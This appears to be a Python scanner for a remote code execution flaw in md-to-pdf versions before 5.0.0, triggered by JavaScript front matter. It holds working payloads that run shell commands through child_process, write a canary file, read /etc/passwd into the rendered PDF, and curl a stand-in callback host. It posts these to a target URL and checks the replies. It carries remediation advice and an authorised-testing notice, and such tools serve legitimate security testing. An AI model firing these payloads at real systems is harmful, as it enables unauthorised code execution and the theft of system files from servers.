#!/usr/bin/env python3
"""
mdtopdf_rce_scanner.py
Scanner for CVE / SNYK-JS-MDTOPDF-1657880
gray-matter JS front matter RCE in md-to-pdf < 5.0.0

Research ref: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
              simonhaenisch/md-to-pdf#99
"""

from __future__ import annotations

import argparse
import json
import re
import socket
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# Each payload writes a unique probe file and/or exfils data.
# We use a UUID canary so blind results can be confirmed.

CANARY = uuid.uuid4().hex

PAYLOADS = {
    "file_write": (
        # Writes a canary file to /tmp — confirms RCE without network callback
        "---js\n"
        '((require("child_process"))'
        f'.execSync("echo {CANARY} > /tmp/.mdpdf_{CANARY[:8]}"))\n'
        "---\n# RCE Test"
    ),
    "exfil_passwd": (
        # Attempts to read /etc/passwd and embed in CSS (visible in PDF)
        "---js\n"
        "{\n"
        "  css: `body::before { content: \""
        '${require("fs").readFileSync("/etc/passwd","utf8").split("\\n")[0]}'
        '"; display: block }`\n'
        "}\n"
        "---\n# Exfil Test"
    ),
    "ssrf_callback": (
        # OOB callback — swap HOST:PORT for your listener / Burp Collaborator
        "---js\n"
        '((require("child_process"))'
        '.execSync("curl -sk http://CALLBACK_HOST/mdpdf_'
        f'{CANARY[:8]}"))\n'
        "---\n# SSRF Test"
    ),
    "recon": (
        # Benign recon — embeds id + hostname into the PDF CSS
        "---js\n"
        "{\n"
        "  css: `body::before { content: \""
        '${require("child_process").execSync("id && hostname").toString().trim()}'
        '"; display: block }`\n'
        "}\n"
        "---\n# Recon"
    ),
}

SAFE_PAYLOAD = (
    # Should always succeed — no JS engine needed
    "---\ntitle: safe\n---\n# Hello World"
)


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class ScanTarget:
    url: str
    upload_path: str = "/new"          # POST endpoint that accepts markdown
    export_path: str = "/new"          # Where to trigger PDF export
    content_field: str = "content"     # Form field name for markdown body


@dataclass
class Finding:
    target: str
    payload_name: str
    payload: str
    evidence: str
    severity: str = "CRITICAL"
    cve: str = "SNYK-JS-MDTOPDF-1657880"
    timestamp: str = field(
        default_factory=lambda: datetime.utcnow().isoformat() + "Z"
    )


# ---------------------------------------------------------------------------
# HTTP helpers  (stdlib only — no requests dependency)
# ---------------------------------------------------------------------------

def http_post(
    url: str,
    data: dict[str, str],
    timeout: int = 15,
    headers: Optional[dict[str, str]] = None,
) -> tuple[int, bytes, dict]:
    """Simple multipart/form-data POST."""
    boundary = uuid.uuid4().hex
    body_parts = []

    for key, value in data.items():
        body_parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
            f"{value}\r\n"
        )
    body_parts.append(f"--{boundary}--\r\n")
    body = "".join(body_parts).encode()

    req_headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
        "User-Agent": "Mozilla/5.0 (security-research)",
    }
    if headers:
        req_headers.update(headers)

    req = Request(url, data=body, headers=req_headers, method="POST")
    try:
        with urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except HTTPError as e:
        return e.code, e.read(), {}
    except URLError as e:
        raise ConnectionError(str(e)) from e


def http_get(
    url: str,
    timeout: int = 10,
) -> tuple[int, bytes]:
    req = Request(url, headers={"User-Agent": "Mozilla/5.0 (security-research)"})
    try:
        with urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except HTTPError as e:
        return e.code, b""
    except URLError as e:
        raise ConnectionError(str(e)) from e


# ---------------------------------------------------------------------------
# Version detection
# ---------------------------------------------------------------------------

VERSION_PATTERNS = [
    # Common places md-to-pdf / dillinger expose their version
    r'"md-to-pdf"\s*:\s*"([^"]+)"',
    r'mdtopdf[/ ]v?(\d+\.\d+\.\d+)',
    r'md-to-pdf@(\d+\.\d+\.\d+)',
]


def detect_version(base_url: str) -> Optional[str]:
    """Best-effort version fingerprint from common endpoints."""
    probe_paths = [
        "/package.json",
        "/api/version",
        "/version",
        "/_status",
    ]
    for path in probe_paths:
        try:
            status, body = http_get(urljoin(base_url, path))
            if status == 200:
                text = body.decode(errors="replace")
                for pattern in VERSION_PATTERNS:
                    m = re.search(pattern, text, re.IGNORECASE)
                    if m:
                        return m.group(1)
        except Exception:
            continue
    return None


def is_vulnerable_version(version: str) -> bool:
    """< 5.0.0 is vulnerable."""
    try:
        parts = [int(x) for x in version.lstrip("v").split(".")[:3]]
        return parts[0] < 5
    except Exception:
        return False  # Unknown — test anyway


# ---------------------------------------------------------------------------
# Core scanner
# ---------------------------------------------------------------------------

class MdToPdfScanner:

    def __init__(
        self,
        target: ScanTarget,
        callback_host: Optional[str] = None,
        timeout: int = 15,
        verbose: bool = False,
    ):
        self.target = target
        self.callback_host = callback_host
        self.timeout = timeout
        self.verbose = verbose
        self.findings: list[Finding] = []

    def _log(self, msg: str):
        if self.verbose:
            print(f"    {msg}")

    def _post_markdown(self, markdown: str) -> tuple[int, bytes]:
        """POST markdown to the target and return (status, body)."""
        status, body, _ = http_post(
            urljoin(self.target.url, self.target.upload_path),
            {self.target.content_field: markdown},
            timeout=self.timeout,
        )
        return status, body

    def _check_canary_file(self) -> bool:
        """
        Check if our canary file was written.
        Only works if the app exposes a file path we can read,
        or if you have shell access post-exploitation.
        Records the canary details so you can check manually.
        """
        canary_path = f"/tmp/.mdpdf_{CANARY[:8]}"
        self._log(f"Canary file would be at: {canary_path}")
        self._log(f"Canary value: {CANARY}")
        # In a real engagement you'd check via LFI, SSRF, or shell access.
        # We flag it as unconfirmed and let the analyst verify.
        return False  # conservative — mark as unconfirmed

    def _probe_safe(self) -> bool:
        """Confirm the endpoint accepts markdown at all."""
        try:
            status, _ = self._post_markdown(SAFE_PAYLOAD)
            self._log(f"Safe probe status: {status}")
            return status in (200, 201, 202, 302)
        except Exception as e:
            self._log(f"Safe probe failed: {e}")
            return False

    def _run_payload(self, name: str, raw_payload: str) -> Optional[Finding]:
        """Send a single payload and analyse the response."""
        payload = raw_payload
        if self.callback_host:
            payload = payload.replace("CALLBACK_HOST", self.callback_host)

        self._log(f"Sending payload: {name}")

        try:
            status, body = self._post_markdown(payload)
        except Exception as e:
            self._log(f"  request error: {e}")
            return None

        body_text = body.decode(errors="replace")
        self._log(f"  response: {status} / {len(body)} bytes")

        evidence = self._analyse_response(name, status, body_text)
        if evidence:
            return Finding(
                target=self.target.url,
                payload_name=name,
                payload=payload,
                evidence=evidence,
            )
        return None

    def _analyse_response(
        self, payload_name: str, status: int, body: str
    ) -> Optional[str]:
        """
        Heuristics to detect successful RCE in the response.
        Expand these as you encounter new app behaviours.
        """
        indicators = []

        # 1. JS engine explicitly NOT disabled — no error thrown
        #    Vulnerable versions silently process JS front matter.
        #    Fixed versions (>= 5.0.0) return an error like:
        #    "JS engine is disabled"
        if status in (200, 201) and "js engine is disabled" not in body.lower():
            indicators.append(
                f"JS front matter accepted without error (HTTP {status})"
            )

        # 2. Canary / known RCE strings in body
        canary_hits = [
            ("uid=", "id command output detected"),
            ("root:", "/etc/passwd content detected"),
            (CANARY[:8], "canary value reflected in response"),
            ("execSync", "raw payload reflected (possible error leak)"),
        ]
        for needle, label in canary_hits:
            if needle in body:
                indicators.append(label)

        # 3. Explicit JS-disabled error → NOT vulnerable
        if "js engine is disabled" in body.lower():
            self._log("  [safe] JS engine disabled error detected")
            return None

        # 4. Server error may indicate the JS ran but crashed
        if status == 500 and payload_name in ("file_write", "recon"):
            indicators.append("500 error after JS payload — possible partial execution")

        return " | ".join(indicators) if indicators else None

    def run(self) -> list[Finding]:
        """Run full scan against the target."""
        print(f"\n[*] Target:  {self.target.url}")
        print(f"[*] Canary:  {CANARY[:8]}...")

        # Version fingerprint
        version = detect_version(self.target.url)
        if version:
            vuln = is_vulnerable_version(version)
            status_str = "VULNERABLE" if vuln else "likely patched"
            print(f"[*] Version: {version} → {status_str}")
        else:
            print("[*] Version: unknown (proceeding with active test)")

        # Confirm endpoint is alive
        print("[*] Probing endpoint...")
        if not self._probe_safe():
            print("[!] Endpoint did not respond to safe probe — aborting")
            return []

        print("[*] Running payloads...\n")

        for name, payload in PAYLOADS.items():
            # Skip SSRF payload if no callback host configured
            if name == "ssrf_callback" and not self.callback_host:
                self._log("Skipping ssrf_callback (no --callback-host set)")
                continue

            finding = self._run_payload(name, payload)
            if finding:
                self.findings.append(finding)
                print(f"  [!!] POTENTIAL HIT — {name}")
                print(f"       {finding.evidence}")
            else:
                print(f"  [ok] {name} — no indicator")

        return self.findings


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

def print_report(findings: list[Finding]):
    print("\n" + "=" * 70)
    print("SCAN REPORT — SNYK-JS-MDTOPDF-1657880")
    print("=" * 70)

    if not findings:
        print("\n[+] No confirmed findings. Target may be patched (>= 5.0.0).")
        print("    Always verify manually — heuristics can miss blind RCE.\n")
        return

    print(f"\n[!!] {len(findings)} potential finding(s)\n")
    for i, f in enumerate(findings, 1):
        print(f"  [{i}] {f.payload_name}")
        print(f"       Target:   {f.target}")
        print(f"       CVE:      {f.cve}")
        print(f"       Severity: {f.severity}")
        print(f"       Evidence: {f.evidence}")
        print(f"       Time:     {f.timestamp}")
        print()

    print("-" * 70)
    print("REMEDIATION")
    print("-" * 70)
    print("  - Upgrade md-to-pdf to >= 5.0.0")
    print("  - Ensure gray-matter JS engine is disabled:")
    print('    grayMatter(content, { engines: { js: () => { throw new Error() } } })')
    print("  - Never process untrusted markdown server-side")
    print("=" * 70 + "\n")


def save_report(findings: list[Finding], path: str):
    output = {
        "scanner": "mdtopdf_rce_scanner",
        "cve": "SNYK-JS-MDTOPDF-1657880",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "canary": CANARY,
        "findings": [
            {
                "target": f.target,
                "payload_name": f.payload_name,
                "severity": f.severity,
                "evidence": f.evidence,
                "payload": f.payload,
                "timestamp": f.timestamp,
            }
            for f in findings
        ],
    }
    Path(path).write_text(json.dumps(output, indent=2))
    print(f"[+] Report saved: {path}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Scanner for SNYK-JS-MDTOPDF-1657880 (gray-matter JS RCE)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan against a local dillinger instance
  mdtopdf_rce_scanner.py -u http://localhost:8080

  # With OOB callback (Burp Collaborator / interactsh)
  mdtopdf_rce_scanner.py -u http://target.com --callback-host your.burp.collab

  # Custom upload endpoint + verbose
  mdtopdf_rce_scanner.py -u http://target.com --upload-path /api/convert -v

  # Save JSON report
  mdtopdf_rce_scanner.py -u http://target.com -o report.json

⚠  For authorised testing only.
        """,
    )

    parser.add_argument("-u", "--url", required=True, help="Target base URL")
    parser.add_argument(
        "--upload-path",
        default="/new",
        help="POST endpoint path (default: /new)",
    )
    parser.add_argument(
        "--content-field",
        default="content",
        help="Form field name for markdown (default: content)",
    )
    parser.add_argument(
        "--callback-host",
        help="OOB callback host for SSRF/DNS payload (e.g. your.burp.collab)",
    )
    parser.add_argument("-o", "--output", help="Save JSON report to file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print("\n=== md-to-pdf RCE Scanner ===")
    print("    SNYK-JS-MDTOPDF-1657880 / gray-matter JS engine\n")

    target = ScanTarget(
        url=args.url.rstrip("/"),
        upload_path=args.upload_path,
        content_field=args.content_field,
    )

    scanner = MdToPdfScanner(
        target=target,
        callback_host=args.callback_host,
        verbose=args.verbose,
    )

    try:
        findings = scanner.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)

    print_report(findings)

    if args.output:
        save_report(findings, args.output)

    sys.exit(0 if not findings else 1)


if __name__ == "__main__":
    main()
